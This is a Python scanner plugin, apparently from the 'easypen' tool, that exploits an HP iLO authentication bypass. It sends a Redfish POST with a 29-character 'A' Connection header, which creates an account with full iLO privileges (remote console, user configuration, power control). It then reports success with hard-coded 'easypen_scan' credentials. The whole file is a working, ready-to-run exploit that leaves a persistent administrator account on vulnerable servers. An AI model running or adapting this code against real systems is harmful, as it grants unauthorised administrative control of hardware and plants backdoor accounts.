#!/usr/bin/env python3
# coding=utf-8

from lib.poc.dummy import *

exploit_trigger = {'Connection': 'A' * 29, 'Content-Type': 'application/json'}
accounts_url = 'https://%s/rest/v1/AccountService/Accounts'


async def exploit(ip, port, url, username, password):
    oem = {
        'Hp': {
            'LoginName': username,
            'Privileges': {
                'LoginPriv': True,
                'RemoteConsolePriv': True,
                'UserConfigPriv': True,
                'VirtualMediaPriv': True,
                'iLOConfigPriv': True,
                'VirtualPowerAndResetPriv': True,
            }
        }
    }
    body = {
        'UserName': username,
        'Password': password,
        'Oem': oem
    }

    try:
        r = await http_client(ip, port).post(accounts_url % url, json=body, headers=exploit_trigger, timeout=20)

        if r.status_code == 201 and "UserName\":\"{}".format(username) in r.text:
            return True, r.text
        if r.status_code == 400 and 'UserAlreadyExist"}]' in r.text:
            return True, 'user exists'
    except Exception as e:
        pass

    return False, 'Fail'


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    if port != 443:
        return
    try:
        r = await http_client(ip, port).get(accounts_url % ip, timeout=20)
        if r.text.find('"code":"iLO.') < 0:
            return

        username = "easypen_scan"
        password = "easypen_scan@2022.09!"
        result = await exploit(ip, port, "{}:{}".format(ip, port), username, password)
        if result[0]:
            ret = {
                'alert_group': 'HP iLO Auth Bypass',
                'affects': 'https://{}:{}'.format(ip, port),
                'details': u'通过该漏洞可创建一个HP iLO的管理员帐号，并进行操作\n'
                           u'修复建议: [link has been removed]\n\n'
                           u'create user: {}/{}\nreturn: {}'.format(username, password, result[1])
            }
            return ret
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 443, 'https', True, task_msg={})
    run_plugin_test(scan)
